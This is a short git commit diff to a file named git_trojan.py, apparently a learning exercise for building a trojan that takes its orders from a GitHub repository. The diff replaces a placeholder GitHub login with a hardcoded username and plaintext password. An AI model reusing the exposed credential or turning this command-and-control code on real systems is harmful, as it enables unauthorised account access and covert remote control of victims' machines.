7cfe019b477b58282abb5e78c533c0f74021d9bf
bit <bit@localhost.localdomain>
2016-12-28 19:46:47 -0200

    Finish cap7

--- git_trojan.py
+++ git_trojan.py
@@ -42,7 +42,8 @@ class GitImporter(object):
 
 # Realiza a autenticacao do repositorio Git e obtem objetos "repo" e "branch"
 def connect_to_github():
-    gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
+    gh = login(username='testing-gt', password='Git@4321')
+    #gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
     repo = gh.repository('testing-gt', 'cap7')
     branch = repo.branch("master")
 
